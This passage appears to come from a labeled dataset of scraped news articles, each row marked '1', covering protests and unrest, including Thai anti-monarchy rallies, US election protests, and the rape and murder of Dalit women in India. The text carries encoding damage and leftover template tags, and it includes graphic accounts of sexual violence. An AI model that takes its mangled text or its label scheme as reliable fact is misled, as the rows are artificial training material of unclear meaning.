constitution is going to lead to the abolition of the monarchy,â€ the royalist leader, Warong Dechgitvigrom, told reporters. Protesters have said they do not want abolition of the monarchy, but believe it should be brought under the constitution. They have also called for the removal of harsh defamation laws that protect the royal family from criticism. Anyone who â€œdefames, insults or threatens the king, queen, heir apparent or regentâ€ can face up to 15 years in prison. Strict lÃ¨se majestÃ© laws make it a crime to criticise, defame or insult members of Thailand's royal family. In practice, this means open discussion or critical reporting about the royal family is considered illegal. The military junta, which seized power in 2014, has been criticised for using the law â€“ which can see people jailed for up to 15 years on each count â€“ to stifle opposition. In 2015, a man was jailed for 30 years over six Facebook posts and the local printer of the New York Times refused to publish an edition with a story on the king. Surrounded by the unrest, several MPs and senators left parliament in the afternoon on boats from a pier behind the building. On Wednesday they are expected to vote on which, if any, of seven constitutional amendment bills should be debated. The most controversial, which aims to undo the changes introduced under military rule, has been put forward by the human rights NGO iLaw. It says the 250 military-appointed senators should be replaced with elected officials, and does not, like other proposals, prevent changes to parts of the constitution that relate to the monarchy. However, despite receiving about 100,000 signatures it is unlikely to pass. The royal palace has not responded to the protests, although the king has said of demonstrators â€œwe love them all the sameâ€. In recent comments, he described Thailand as the â€œland of compromiseâ€."

1,"Dozens of demonstrators converged outside the Echo Park home of Los Angeles County Public Health Director Barbara Ferrer on Sunday afternoon to express their displeasure with a new round of COVID-19 restrictions that will take effect Monday. Carrying signs and waving flags, the protesters called on Ferrer to â€œOpen L.A.â€ and chanted, â€œNo science. No data. No shutdown.â€ Few of the 50 or so demonstrators were wearing face masks. More people here now, and a bit of a shouting match erupting between the protesters and a resident on this street. pic.twitter.com/SQ6YYZ2FcB   The countyâ€™s latest Safer at Home order was announced Tuesday amid an alarming increase in coronavirus cases and COVID-19 deaths. Its slew of restrictions includes a ban on most gatherings, stricter limits on retail businesses, and closures of playgrounds that arenâ€™t part of a school or childcare center. The order will be in effect for three weeks, until Dec. 20. Those restrictions came on the heels of a previously announced rule that suspended outdoor dining at restaurants throughout most of the county. Pasadena, which has its own health department, opted to allow outdoor dining to continue. In addition, Gov. Gavin Newsom recently announced a statewide curfew that forbids nonessential gatherings with members of other households between the hours of 10 p.m. and 5 a.m. The recent restrictions have drawn the ire of business owners, exhausted parents and others who are simply losing patience with the pandemic way of life. One of the protesters outside Ferrerâ€™s home carried a sign that read, â€œNewsom and Ferrer are non-essential.â€ Another shouted, â€œHow dare you take away our guns and lock us in?â€ California L.A. Countyâ€™s new stay-home order is the strictest in California. Hereâ€™s how it works Los Angeles County has issued a new COVID-19 pandemic order in a desperate move aimed at slowing an unprecedented surge of coronavirus infections.   Some of the demonstrators raised other grievances, including the outcome of the 2020 presidential election. Several people brought Trump flags, and one held a sign that declared â€œTrump won.â€ Several people got into heated exchanges with Ferrerâ€™s neighbors, including one resident who called the protesters â€œfascistsâ€ and Nazis.â€ Though noisy at times, the protest remained peaceful until the demonstrators dispersed around 5 p.m. California Photos: Gov.

County residents have taken heed of the public health orders intended to slow the spread of the coronavirus in the community. But patience is wearing thin, and some people have become more vocal in opposing them.

1,"KTLA by: Associated Press Kyle Rittenhouse is accused of killing two protesters days after Jacob Blake was shot by police in Kenosha, Wis. (Antioch Police Department via AP) A 17-year-old from Illinois who is charged with killing two people during a protest in Wisconsin and whose case has become a rallying cry for some conservatives posted $2 million bail Friday and was released from custody. Kyle Rittenhouse is accused of fatally shooting Joseph Rosenbaum and Anthony Huber and wounding Gaige Grosskreutz during a demonstration Aug. 25 that followed the police shooting of Jacob Blake in Kenosha. He posted bond through his attorney at about 2 p.m., Kenosha County Sheriffâ€™s Sgt. David Wright said. Rittenhouse, of Antioch, Illinois, told police he was attacked while he was guarding a business and that he fired in self-defense. He faces multiple charges, including intentional homicide, reckless endangerment and being a minor in possession of a firearm. Wisconsin law doesnâ€™t permit minors to carry or possess a gun unless theyâ€™re hunting. He is due back in court on Dec. 3 for a preliminary hearing. His case has taken on political overtones. Supporters of the Black Lives Matter movement have painted Rittenhouse as a trigger-happy white supremacist. Conservatives upset over property destruction during recent protests have portrayed him as a patriot exercising his right to bear arms during unrest. A legal defense fund for him has attracted millions of dollars in donations, and his mother got a standing ovation from women at a Waukesha County GOP function in September. Huberâ€™s father, John Huber, asked Kenosha County Circuit Court Commissioner Loren Keating during a hearing Nov. 2 to set Rittenhouseâ€™s bail between $4 million and $10 million. Huber said Rittenhouse thinks heâ€™s above the law and noted the effort to raise money on his behalf. He also suggested militia groups would hide him from police if he were released. Rittenhouseâ€™s attorney, Mark Richards, asked for $750,000 bail. Keating ultimately set bail at $2 million, saying Rittenhouse was a flight risk given the seriousness of the charges against him.

1,"ADVERTISEMENT SHARE Rep. Ilhan Omar (D., Minn.) likened President Donald Trump's campaign rallies to Ku Klux Klan rallies in a Monday interview with the Washington Post. Trump ""chose to speak about me at every single rally, didn't really matter where he was, sometimes multiple times in a day, as he held his Klan rallies across the country,"" Omar said to Post opinion writer Jonathan Capehart. Omar, a member of the far-left group of House Democrats known as ""the Squad,"" reflected on ousting President Trump and what she perceived as ""a four-year assault"" on refugees and immigrants like her. She also discussed infighting between moderate and leftist Democrats, sparked by the party's lackluster House and Senate election results. Omar said in the interview that the rift within the Democratic Party ""isn't as strong as it's being made out to be,"" despite House Democrats' chaotic post-election phone call. During the call, Abigail Spanberger (D., Va.), who was first elected to the House alongside Omar in 2018, blamed leftists' radical anti-police and socialist messaging for her near-loss in this election. Throughout the Trump presidency, ""the Squad"" and other progressive Democrats have likened President Donald Trump and his supporters to fascists and white supremacists. Omar also compared the president's rallies to Klan rallies in a tweet last year. Rep. Alexandria Ocasio-Cortez (D., N.Y.) quoted a Klansman to criticize Trump's national security policies in a tweet last year, and failed Democratic presidential candidate Beto O'Rourke compared Trump's rallies to Nazi meetings.

In Phoenix, roughly 100 protesters converged in front of the Maricopa County Elections Department, chanting â€œStop the steal!â€ and â€œCount my vote.â€ Many were without masks and some were armed with rifles and handguns. The rally comes as The Associated Press has declared Democratic nominee Joe Biden as the winner in Arizona, flipping a state that has a long political history of voting Republican. Trump had won Arizona in 2016. The AP called the race early Wednesday morning, after an analysis of ballots concluded that there werenâ€™t enough outstanding to allow Trump to catch up. Gilbert resident Chris Michael, 40, joined protesters outside the Maricopa County Elections Department Wednesday night. Michael told Reuters that he came to make sure all votes are counted. He said he wants assurances that the counting was done â€œethically and legally.â€ Republican Rep. Paul Gosar also joined the crowd, declaring: â€œWeâ€™re not going to let this election be stolen. Period.â€ Observers from both major political parties were inside the election center as ballots were processed and counted, and the procedure was live-streamed online at all times. Several sheriffâ€™s deputies blocked the entrance to the building. The vote-counting carried on into the night, Maricopa County Elections Department spokeswoman Megan Gilbertson said. Two top county officials â€” one a Democrat, the other a Republican â€” issued a statement expressing concern about how misinformation had spread about the integrity of the election process. â€œEveryone should want all the votes to be counted, whether they were mailed or cast in person,â€ said the statement signed by Clint Hickman, the GOP chair of the Maricopa County Board of Supervisors, and Democratic Supervisor Steve Gallardo. â€œAn accurate vote takes time. â€¦ This is evidence of democracy, not fraud.â€ In Detroit, Trump supporters gathered by a ballot-tallying center shortly before The Associated Press declared that Biden had won Michigan. Video shot by local media showed angry people gathered outside the TCF Center and inside the lobby, with police officers lined up to keep them from entering the counting area. They chanted â€œStop the count!â€ and â€œStop the vote!â€ Earlier, Trumpâ€™s campaign filed a lawsuit in a bid to halt the count, demanding Michiganâ€™s Democratic secretary of state allow in more inspectors. Trump has repeatedly insisted without evidence that there are major problems with the voting and the counting. Michigan Attorney General Dana Nessel, a Democrat, insisted both parties and the public had been given access to the tallying â€œusing a robust system of checks and balances to ensure that all ballots are counted fairly and accurately.â€ The Trump campaign also filed lawsuits in Pennsylvania and Georgia Wednesday, laying the groundwork for contesting the battleground states as he slipped behind Biden. The new filings, joining existing Republican legal challenges in Pennsylvania and Nevada, demand better access for campaign observers to locations where ballots are being processed and counted, and absentee ballot concerns, the campaign said. Protests were also reported in other areas of the country, including in Portland, where a riot was declared Wednesday. Many took to the streets in Seattle and New York City overnight, as well.

Protesters carried flags and held signs outside the Governorâ€™s Mansion, just blocks away from the state capitol. The protest comes after the 2020 presidential race was called Saturday morning by the Associated Press and other media outlets, projecting Democratic candidate Joe Biden as the president-elect.

1,"Follow Us Another horrific case has emerged in north Gujarat where a 19-year-old Dalit woman was allegedly kidnapped, gang-raped and murdered before her body was found hanging from a tree, in order to suggest suicide, reported The Hindu. A panel of doctors at the Ahmedabad civil hospital on Wednesday, January 8, conducted the postmortem after the cops lodged a case of kidnapping, gangrape and murder against four persons. According to the report in The Hindu, the four accused had allegedly kidnapped the victim, gang-raped her before murdering her. After killing the victim, the accused hanged the body from the tree to make it look like suicide. The 19-year-old girl had gone missing on December 31, 2019, after which her family approached the police on January 3 to lodge an FIR but the local police refused. According to the report, local police inspector NL Rabri told the family that the girl was safe and had eloped with a boy of the same community and both had got married, so no case was required to be lodged. On 5 January, the victim’s body was found hanging from the tree. The Family members of the victim refused to accept the body, claiming that it was a murder and not a suicide. The police registered an FIR on Tuesday — against Bimal Bharvad, Darshan Bharvad, Satish Bharvad and Jigar in the case. The family agreed to claim the body after registration of the FIR, after which body was sent for postmortem at the Ahmedabad civil hospital. The case was registered under various provisions and sections of the Indian Penal Code and the Scheduled Caste and Scheduled Tribe (Prevention of Atrocities) Act after thousands of Dalits protested in front of the local police station.

1,"INTERACTIVE ELECTION MAPS Why did Chandrashekhar Azad, leader of the Bhim Army, go to Jama Masjid on 20 December 2019 and then again on 18 January? That he wanted to voice his disapproval of the CAA and the NRC is well known. In fact, his first action on being released from Tihar Jail a few days ago was to return to Jama Masjid and vent his anger against the CAA and the NRC, which he described as kaley kanoon or black laws. Azad does not mince words and is willing to hit out against the Modi government. Says he: “The Jama Masjid is a place of great historicity. At the time of the partition of the country, Maulana Azad had stood here and appealed to the Muslims that they should not move to Pakistan as such a move would prove inimical to their interests. Once again, there is a move by the present government to divide the country along religious lines. I come from a village. We are all aware that the CAA and NRC will cause untold sufferings to the poor while the political class will remain unaffected. It was an imperative for me to raise my voice against such a move.” But the government claims that Azad’s presence at Jamia Masjid in December led to a heightening of tensions, so much so that it left several protestors injured at Delhi Gate. Azad insists such a criticism was false because when he was there last month, he had a copy of the Indian Constitution with him. He had only read out its Preamble to the enthused crowds. “I did the same when I went back to Jamia Masjid,” he says. “I read out the Preamble of our Constitution. It is the duty of every citizen to protect it. With the present government trying to divide the nation on the basis of religion, this amounts to nothing less than weakening our Constitution which is respected around the world and is looked upon as a unique document.” Had Ambedkar not authored the remarkable Constitution, Azad says, then Dalits such as myself and lakhs of people belonging to the oppressed communities would have continued to be subjected to humiliation on a daily basis, he says. Azad speaks with passion and that is one of the main reasons for his appeal amongst the youth. He also does not hesitate to take a snipe at prime minister Modi, which is why the BJP has little love lost for him. Now, the court has asked him to speak respectfully of Modi. Azad told me that he “agrees with that” and then he quips, “Shri Shri Modiji occupies a constitutional position but I would also request him to respect the Constitution instead of weakening the foundations of our country. I would not have opposed the CAA if he had included Tamils and Muslims rather than differentiating refugees on the basis of their faiths.” Azad says he emulates his hero, the revolutionary freedom fighter Chandrashekhar Azad. He has, of course, combined his trademark moustache with a blue scarf. He is all praise for the thousands of women who have been sitting day and night in the cold weather protesting against CAA-NRC but is unhappy over students, especially women, being beaten up in Jamia Milia Islamia and at JNU. “It is very sad....thereafter, students were beaten up in JNU, AMU, DU and other universities. I am very proud of the way hundreds of our sisters along with their children have been sitting there for over a month. But if prime minister cannot hear their voices, how will he hear the voices of crores of people living in the villages?” he says. What has really alarmed Azad is the statement of RSS leader Mohan Bhagwat on Friday that there was no question of backing out from the CAA. “It is alarming that this statement came not from the PM or the home minister but from the RSS. It just shows that the RSS is the BJP and the BJP is the RSS. We all know their agenda is to establish a Hindu Rashtra. The RSS has never accepted our Constitution and that is why they are jailing people for reading the Constitution. But opposition to these laws will not cease. We will fight and get these laws repealed even if this involves going to jail a thousand times,” he says, with bravado. Azad was jailed in 2017, in an environment of growing atrocities against the Dalits. The Dalits, at the same time, have emerged as an important vote bank. Was the present regime worried that Azad’s appeal amongst the Dalits was growing. Could this be one reason why he is being jailed frequently? “Maybe,” Azad says, “I am being stopped from entering Delhi because I am a Dalit.” In his view, anyone who opposes the government is dubbed an anti-national, but it is the opposition parties who keep alive the spirit of democracy. “The BJP believes that the more muddied the politics of this country will become, the more the lotus will bloom,” he says. Azad also clarifies that he has no plans to enter the electoral fray at present. “We had thought of contesting elections but a decision has been postponed. Fighting the CAA-NRC is a much more crucial battle. I want to meet the protestors who have been jailed in UP. It is important to remove their fear and to build up a sense of solidarity across the country,” he says, adding, “I am ready to be led by anyone who has raised the gauntlet against the government.” “There is no court bigger than the people’s court and why should the prime minister presume that he is larger than the Constitution,” he says. Agreed, no political party is leading this protest. Rather, it is being led by the people. “The country is going through a very crucial juncture,” Azad says. “If we do not speak up now, we will not be able to go back.”  The author is a freelance journalist.

1,"Uttar Pradesh clashed with Congress leaders Rahul and Priyanka Gandhi, who had decided to walk all the way after cops stop their vehicle  Congress leader Rahul Gandhi was roughed up and pushed to ground when he and his party members decided to walk over 160kilometers to Hathras, Uttar Pradesh. The police and party workers scuffle broke out in UP territory when cops tried to prevent him from moving on from the Greater Noida area on Thursday afternoon. He was accompanied by his sister Priyanka Gandhi and a large number of party leaders, and workers. The group was trying to make their way to reach Hathras and meet the grieving Dalit family whose daughter was raped, murdered, killed by 'upper-caste' men, and then her body hastily cremated by the local administration. Now the Uttar Pradesh police has used force, including lathi charge, as seen in some visuals on social media, in their attempt to stop the Congress leaders and the massive crowd of workers. According to a report in the India Today, Rahul Gandhi was pushed to the ground by the police personnel. The Uttar Pradesh Police stopped them at the Yamuna Expressway, citing imposition of Section 144, which prohibits the assembly of four or more people. However the visuals show how the police themselves charged at the unarmed crowds. Priyaka Gandhi shared photos of injured partyment and said when the police initially stopped their vehicles they decided to walk the over 160 km to hathras, “We were repeatedly stopped, the police used lathis in a barbaric manner. Many workers are injured,” she said.  हाथरस जाने से हमें रोका। राहुल जी के साथ हम सब पैदल निकले तो बारबार हमें रोका गया, बर्बर ढंग से लाठियाँ चलाईं। कई कार्यकर्ता घायल हैं। मगर हमारा इरादा पक्का है। एक अहंकारी सरकार की लाठियाँ हमें रोक नहीं सकतीं। काश यही लाठियाँ, यही पुलिस हाथरस की दलित बेटी की रक्षा में खड़ी होती। pic.twitter.com/lRq9kLSHJz  एक घमंडी सत्ता मासूम बच्चियों के मृत शरीरों पर अपनी ताकत का प्रदर्शन कर रही है। अन्याय को रोकने के बजाए, खुद अन्याय कर रही है। महिलाओं के लिए एक सुरक्षित समाज और प्रदेश के लिए- जहां वो आज़ादी से जी सकें और आगे बढ़ सकें - हमारा संघर्ष जारी रहेगा।  Earlier the UP administration banned large gatherings citing coronavirus situations in the area, and as reported by NDTV, barricades have been put up and the borders sealed. Now as the police tried to stop Rahul and Priyanka Gandhi, and the visuals of them recorded by India Today TV team, show the police personnel manning the UP border in Greater Noida trying to physically stop Rahul Gandhi from going any further on the Yamuna Expressway. Their convoy was stopped near the Pari Chowk junction in Greater Noida. Rahul Gandhi reiterated that he wanted to meet the family of the victim's family and was ""ready to go all alone on foot"" to Hathras, stated the news report adding that the police did not relent, and during the “sharp exchanges between Rahul Gandhi and the officials” kept citing that “prohibitory orders” were in place in Hathras, where the administration has “imposed CrCPC Section 144” and restricted outsiders from entering the district.  दुख की घड़ी में अपनों को अकेला नहीं छोड़ा जाता। UP में जंगलराज का ये आलम है कि शोक में डूबे एक परिवार से मिलना भी सरकार को डरा देता है। इतना मत डरो, मुख्यमंत्री महोदय!  Rahul Gandhi and Priyanka Gandhi were taken into custody by the Uttar Pradesh police. It is reported that Rahul Gandhi then said, ""I want to walk to Hathras alone.

Times of India’s Edit Page team comprises senior journalists with wide-ranging interests who debate and opine on the news and issues of the day. Politics is a lot about seizing the moment and Dalit neta Chandrashekhar Azad may have done just that when he showed up last month at the protests against the Citizenship (Amendment) Act in Delhi. Over 25 days in jail may have ensued but the optics of Azad at Jama Masjid, holding aloft a copy of the Constitution with BR Ambedkar’s face adorning the cover, will endure for some time. In one stroke, Azad received the national attention he was seeking and projected himself as a votary of a Dalit-Muslim socio-political alliance. BSP supremo Mayawati has reason to worry after an unchallenged run as the country’s tallest Dalit neta since her mentor Kanshi Ram’s passing. Younger Dalits are not enthused by her aloofness and defeats in successive elections. Azad’s Bhim Army rose to prominence during the 2017 Saharanpur riots when Dalits clashed violently with Thakurs, just months after BSP’s rout and BJP’s ascendance in the UP assembly polls. Arrested and detained for over a year under the draconian National Security Act, Azad has since toned down his rhetoric in an obvious attempt to widen his appeal. But can a Dalit-Muslim alliance take hold? Muslims in Azad’s home state UP are split between SP, BSP and Congress. They made common cause with the Yadavs under the influence of Lalu Prasad and Mulayam Singh Yadav but ties are weakening now amid reverse consolidation by other groups. Actually Azad cannot even take Dalit support for granted. But his chutzpah marks him out. The present movement, like the anti-Emergency struggle, offers opportunities to new politicians to emerge. So the incongruity of the stiff bail terms keeping Azad out of Delhi until the assembly election sticks out. Disparate parties that sense the promise of this young politician would be happy that he is being kept away from the ‘action’, for now.  {{C_D}} {{{short}}} {{#more}} {{{long}}}...

1,"Gujarat Director General of Police (DGP) has set up a Special Investigation team (SIT) and tra-nsferred the investigations into the alleged gang rape and murder of a 19-year-old Dalit woman to Criminal Investigation Department (CID) – Crime. DGP Shivanand Jha also suspended police inspector NK Rabari who was accused of delaying the registration of complaint by the woman’s relatives when she went missing. He was transferred from Modasa town police station to Isari police station in the district on January 12. The three-member SIT headed by DIG Gautam Parmar will also probe allegations against the police officers of derailing the probe and delaying the registration of the complaint. The woman’s body was found hanging from a tree on January 5, within days after she went missing. Family of the deceased alleged that the woman was kidnapped, gang-raped and murdered by four accused persons, of which three have been arrested. The fourth accused is still on the run. All the four have been booked under various provisions of the Indian Penal Code (IPC) and Scheduled Caste & Scheduled Tribe (Prevention of Atrocity) Act. The FIR was filed on the basis of a complaint lodged by a family member of the woman. In the FIR, the complainant alleged that town police inspector Rabari did not act on a complaint that the woman went missing on January 3. The FIR states that Rabari had told the family that their daughter had married a man of her community and that Rabari would produce her along with a marriage certificate. However, on January 5, her body was found hanging from a tree in a village of Modasa. Police registered an FIR in the case against four men after Dalits from the region had protested in big numbers outside Modasa Rural police station. 📣 The Indian Express is now on Telegram.

1,"INTERACTIVE ELECTION MAPS The visceral screams of fear and pain, the sense of utter powerlessness, the dread of ominous threats coming true, the sheer brutality—all of it must have been the same for the 19-year-old who was violated in Boolgarhi village in Hathras, Uttar Pradesh as for 17-year-old Priyanka Bhotmange and her mother Surekha in Khairlanji village, Maharashtra. The two incidents of alleged gang rape and murder of dalit women are separated by 14 long years, during which India’s collective conscience and sensitivity to such crimes was supposedly sharpened by the Nirbhaya case, but the arc of safety and security does not bend any more towards women—especially dalit women—now than it did in 2006. On the contrary, crimes against dalit women, especially assault and rape, have increased manifold. After the Bhotmange women’s mutilated bodies were fished out of a canal in Khairlanji, Bhandara district in Maharashtra, along with violated bodies of Priyanka’s two teenage brothers, on September 29, 2006, it took public outrage, mainly by dalit organisations, for the then Maharashtra government to crank up action. The outrage also stirred Mumbai and Delhi’s media towards covering the horror that had unfolded that evening. In these respects too, not much changed in the past 14 years. Maharashtra’s then Home Minister had expressed doubts that the victims may have been Maoists. In the Hathras case, Uttar Pradesh officials were crass. They initially denied the incident, then called it “fake news”, and displayed their most impervious side, making the brutalised 19-year-old lie on a bench under the blazing sun, sending her only to a local hospital despite grievous injuries, taking her to Delhi only after she turned critical, according to her family. If this was not enough, they burned her body after locking up her family in their home in the middle of the night and admonishing them “aap se bhi kuch galatiyan hui hai”. Dalit women live with little dignity, it seems they must die without dignity too. From Khairlanji to Hathras lie lakhs of stories—many of them corpses—of brutalised women, especially dalit and tribal women, all of whom bore the brunt of toxic masculinity along with gender or caste supremacy on their bodies. From 2006 to 2019, the total number of rapes reported is over 4,00,000; a substantial number of the reported rapes—some estimates say one in every four—is on dalit women. For every rape reported, several go unreported. And this reporting does not include marital rapes. The National Crime Records Bureau data shows the total number of rapes reported in 2006 was a shade less than 20,000; 10 years later, it was closer to 40,000. Occasionally, a particularly brutal case might catch the nation’s attention. Nirbhaya’s plight shook the nation in December 2012, the outrage turned public opinion against the incumbent Congress-led governments in Delhi and the Centre. It led to changes in the criminal law on rape and solemn pledges of “no more Nirbhayas”, a fund was set up, and the case exploited by the Bharatiya Janata Party (BJP) in the 2014 general election. The rise in total rape numbers every year since then was cited as evidence of more women reporting the crime. It might be partly true. The sustained coverage of the Nirbhaya case might have chipped away some of the stigma around reporting rape, but it also established that as many women were being raped. The total number clocking well above 32,000-33,000 every year—2016 was the worst in the past seven years—meant nearly 90 women raped every day. The large majority are statistics, a few are remembered like the little girl in a Kathua temple, the 12-year-old in Chennai raped over seven months, the Kerala nuns, the Unnao case in which the victim was set ablaze near a court, the young woman in Uttar Pradesh who saw her family wiped out after raising her voice against BJP’s MLA Kuldip Sengar and the young veterinarian in Hyderabad. However, to read the rape story only through numbers would be to skim the surface of the horror women face every day. Parse the numbers and the relationship between caste and rape, or any crime against women, is inescapable. Overlay this with state-wise data and it is evident that dalit women in Uttar Pradesh, Rajasthan and Madhya Pradesh, where toxic masculinity meets caste bigotries, face the worst of sexual crimes. These states consistently rank high for crimes against women, especially rapes, and of dalit women. The perpetrators, almost without exception, are men of upper castes. Crimes against dalits increased by 6% between 2009 and 2018, according to the National Dalit Movement for Justice (NDMJ) report this year. “Dalit women often bear the brunt of violence at the hand of dominant caste; violence as grave as physical violence, sexual violence and witch branding. In the Covid-19 pandemic also, Dalit women witnessed various forms of atrocities… In the last five years, 41,867 cases or 20.40% were related to violence against Scheduled Caste women,” the report said. The NCRB confirms the trend of crimes against dalits. It registered surges in such crimes every year between 2013 and 2018. Uttar Pradesh reported the highest number of atrocities against dalits, at 25.6% of all cases reported. In 2017, the agency published data for cases specifically and exclusively registered under the Scheduled Castes and Scheduled Tribes (Prevention of Atrocities) Act 1989. There were 5,775 cases; 55% of them related to “intentional insult or intimidation with intent to humiliate” dalits, other cases pertained to occupation of dalits’ land, preventing dalits from using public places and social boycott. In Boolgarhi-Hathras, the victim’s family was among the few dalit families in the village and had a running dispute over land with their upper caste—Thakur—neighbour, according to her brother who spoke to the media. His grandfather had lost his fingers while trying to save himself during an attack some years ago, he added, detailing how shop-keepers sprinkle water on the money they handed out or how they are not allowed to touch merchandise in a shop. To ignore the context of caste and see it merely as a sexual crime would be meaningless. The young woman, as activists and scholars have pointed out, was assaulted, violated and tortured by the Thakur men to send out a message: stay within your status, don’t mess with us. In Khairlanji, the story was similar. The Bhotmanges was among the handful of dalit houses in the village dominated by OBC-Kunbi caste. Most of the local chatter about why the family was heinously attacked and killed centred on the fact that they owned and tilled five acres, Surekha managed the land affairs herself, and was making sure that her children studied well. She had also stood witness for a Khairlanji policeman in an altercation he had had with some villagers. Together, it was seen as an affront by the upper caste men. The family was not allowed to build a pucca house, Surekha was “a mere Dalit woman was thumbing at us” as an accused villager had told this writer. Surekha was not only raped, she was stripped and paraded around the village, then sexually assaulted by a large group of men such that her skull was broken and an eye was disgorged. Her daughter too was paraded naked, raped, and foreign objects were found in her private parts. Her brothers too suffered similar assaults. These were caste atrocities beyond a shadow of doubt. “The entire village was involved, I was in my farm and then I hid behind a bush,” said Bhaiyyalal Bhotmange, Surekha’s husband. Local cops were suspended and the case investigated by the CBI. The fast-track trial court held eight people guilty of murder and handed out death penalty to six of them. In 2010, the Nagpur bench of the Bombay High Court heard appeals and commuted the death sentence to 25 years imprisonment; it also termed the murders as “revenge killings” and held that the murders were not pre-meditated or motivated by caste prejudices. The SC and ST (Prevention of Atrocities) Act was ignored—and a justification was found for this too. Equally shocking was that the guilty were absolved of rape charges. The delay in registering cases and conducting medical examinations, unwillingness of the local police to prevent erasure of evidence, lackadaisical prosecution were all responsible. The judgement makes a reference to how Priyanka’s body bore injury marks all over and that the accused disrobed her “to get satisfaction to their sexual eyes” but the court held the women were not raped. Bhotmange got some compensation and lived elsewhere, he used to go to his house every September 29, to light a lamp. He died three years ago. The appeals are pending in the Supreme Court. In the Hathras case too, the police reportedly prevented the family from even seeing the victim one last time, held back all villagers, and most insensitively burned her body in the dead of the night. The national outrage ensured that the accused were arrested. But no one is sure that the medical evidence collected will prove the charges of rape in the fast-track court that Uttar Pradesh chief minister Yogi Adityanath set up under pressure. A savarna (upper caste) group already banded together to express support for the accused but the Chief Minister waited out two weeks—and for a nudge from the Prime Minister—before even setting up a Special Investigation Team to probe the case. Even as this was announced, the equally heinous Balrampur case came to light—again a young dalit woman, breaking boundaries to get educated, raped and murdered allegedly by two Muslim men. Crimes against dalits—and tribals—including rape does not happen out of the blue. It often begins with age-old discriminations, each case of insult to and assault of dalits over months and years on land or water or access to public spaces creates an atmosphere in which dalits can be attacked—with impunity. The atmosphere when such seemingly minor cases go unrecorded or unpunished is that upper castes can get away because the administration is “on our side”. Small sections of national or local media have recorded minor crimes against dalits in the past few months; a journalist took note of nearly 18 rapes or gang-rapes in two days after the Hathras incident. These sustained and heinous crimes are a message, according to dalit scholar and professor Anand Teltumbde, now accused of Maoist links and imprisoned. Atrocities against dalits have “a unique mix of sadism and bestiality”, he and S Anand wrote, 10 years after the Khairlanji shocker, atrocities are “a mode of teaching a lesson to the entire Dalit community”. Teltumbde spoke of how Khairlanji dispelled many myths, including that economic development does away with casteism or that dalits in political or administrative power can orient the administration to do justice for the community. The few dalit MLAs in the Uttar Pradesh legislature have been unmoved so far about the insults or atrocities. The Assembly from 2017 comprises nearly 45% upper caste MLAs, up 12% from the previous Assembly. Ministers in Narendra Modi’s cabinet who made political capital out of the Nirbhaya case, even Modi himself, have said little by way of consolation or condemnation of the incidents. Former Union Minister of Women and Child Development Maneka Gandhi and the incumbent, Smriti Irani, were elected from Uttar Pradesh but the vocal women have not said a word. There is no getting away from the fact that the BJP is heavily weighted in favour of upper castes—brahmins, thakurs and banias—in its election strategies and political capital, never mind the talk about “sabka saath”. In his analytical book, ‘Khairlanji: A Strange and Bitter Crop”, Teltumbde detailed why such cases of extreme brutality on dalits, especially women, are not “isolated events” or “just misdeeds of some uncultured barbaric monsters”. Violence against dalits, especially rape, is a functional and systematic way of enforcing social order which is why it is “performed as a public spectacle by collectives…rape is not a private affair, it becomes a celebratory spectacle. Atrocities involve intricate and devious planning so that they become a ‘lesson’ for the entire Dalit community”, he wrote. This is why knee-jerk reactions such as “hang the rapists” cries that gathered momentum over Hathras, hanging the rapists of Nirbhaya, killing the accused in police encounters as in Hyderabad do not address the core issue of continuing and escalating attacks on dalits. These actions merely satisfy the revenge motive in an outraged public without in any way addressing the underlying caste issues. That is why, in his book, Teltumbde cautioned, “Every village in India is a potential Khairlanji”.

1,"The court found the three guilty of all charges A special court in Telangana on Thursday sentenced three men to death for raping and murdering a Dalit woman last year. The court has also imposed a total fine of Rs 26,000 on them. The body of the 30-year-old woman was found with her throat slit and stab marks on 25 November, 2019, a day after the offence. The woman used to sell balloons for a living. Three men were arrested on November 27 and charged under relevant sections of the Indan Penal Code for gang rape and murder besides the Scheduled Castes and the Scheduled Tribes (Prevention of Atrocities) Act, Additional Public Prosecutor M Ramana Reddy said. The court found them guilty under all the sections and awarded the death penalty. The three accused had earlier pleaded not guilty. Expressing happiness over the verdict, the woman's husband said ""We are happy. Justice has been meted out and we request the court that they should be hanged immediately."" The Telangana government had last month issued orders, designating the Fifth Additional Sessions Court as the special court for speedy trial in the case. On December 14, 2019, a charge sheet was filed and the trial commenced on December 23. Arguments were completed on January 20 and the case was subsequently posted for judgment. As many 25 witnesses were produced by the prosecution that had been demanding capital punishment on the lines of death penalty awarded to the accused in the Nirbhaya gang rape murder case in Delhi.  Earlier in December, the woman's family and different organisations had staged protests and demanded an ""encounter"" death for the three men like the four accused in the Hyderabad veterinarian's gang rape and murder case. The four accused in the veterinarian case were killed in an alleged exchange of fire with police on the outskirts of Hyderabad on December 6, 2019.

1,"NEWS Bhavya Mehta On 5th January a body of a 19-year-old Dalit woman was found hanging from a banyan tree in Saira Village, Gujarat. According to the postmortem reports, she was kidnapped, gang-raped and murdered before her body was found hanging by the tree. According to a report in The Hindu, the accused hanged the body of the victim from the tree to make it look like a suicide. The victim had gone missing on 31st December. According to The National Herald, the family approached the local police to file an FIR on 3rd January but the police refused. Inspector NL Rabri, told the family that the girl had eloped with a boy from the same community and insisted that she was 'safe'. The family refused to claim the body until an FIR was filed, they believed that the accused was murdered. It was only on Tuesday, two days after the body was found that the police officially registered an FIR against four men, Bimal Bharvad, Darshan Bharvard, Satish Bharvard and Jigar in this case. Gandhinagar Range Inspector, General Mayansilh Chavda further added: With an aim to spread awareness and bring justice to the victim, netizens have taken to Twitter using a trending hashtag: *Images of tweets are sourced directly from Twitter . The hashtag has been blurred to conceal the identity of the victim.*"
1,"A police inspector was suspended for alleged inaction, while the first post-mortem report did not consider other wounds the 19-year-old sustained. The woman's father sits next to a framed photo of her. Photo: Sukanya Shantha Sayara village, Modasa: The beaming face of a 19- year old woman shines out of a tall, white flex- board hoisted right at the entrance of the Dalit basti in Sayara village of Modasa Taluka. Villagers stop by for a moment or two with their folded hands and read the description printed on the board. The board offers homage to a teenager who was allegedly abducted, gang-raped and brutally murdered on January 5. They hurriedly walk away when inquired about the incident. No one wants to talk about the horrid incident. On January 5, the body of the young woman was found hanging on a long-standing banyan tree, bang at the entrance of the village. The teenager, a second-year commerce student, the sixth of the seven siblings, had left home on January 1 to register herself for an advanced computer course. She never returned. Three weeks since her death and two different investigations later, it has now emerged that the victim was brutally sodomized, dragged and then forcibly hanged from the tree, according to an Ahemdabad Mirror report. Four men, all in their early 20s, have been accused in the case. Also Read: Gujarat Village Erupts in Protests After 19-Year-Old Dalit Woman Gang-Raped and Hanged After the victim went missing on January 